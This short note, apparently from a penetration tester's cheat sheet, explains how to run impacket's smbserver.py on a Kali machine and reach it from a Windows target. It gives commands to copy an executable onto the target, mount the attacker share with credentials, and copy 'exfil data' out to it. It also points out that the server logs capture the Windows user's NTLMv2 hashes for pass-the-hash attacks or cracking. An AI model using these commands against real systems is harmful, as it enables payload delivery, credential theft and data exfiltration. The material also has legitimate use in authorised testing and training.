Set up a SMB server using smbserver.py from impacket
```shell
smbserver.py SHARE_NAME path/to/share
```

From target Windows:
```powershell
net view \\KALI_IP
```
(Should display the SHARE_NAME)
```powershell
dir \\KALI_IP\SHARE_NAME
```
```powershell
copy \\KALI_IP\SHARE_NAME\file.exe .
```
Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user
 can be usefull to PTH, or crack passwords

Since Windows 10, you can't do anonymous smb server anymore
```shell
sudo python smbserver.py SDFR /BloodHound/Ingestors -smb2support -username "peon" -password "peon"
```
```powershell
net use Z: \\192.168.30.130\SDFR /user:peon peon
```
```powershell
net use Z: /delete /y
```

you can move about the cabin.
```powershell
cd Z:\
copy .\some\important\exfil\data Z:\
```
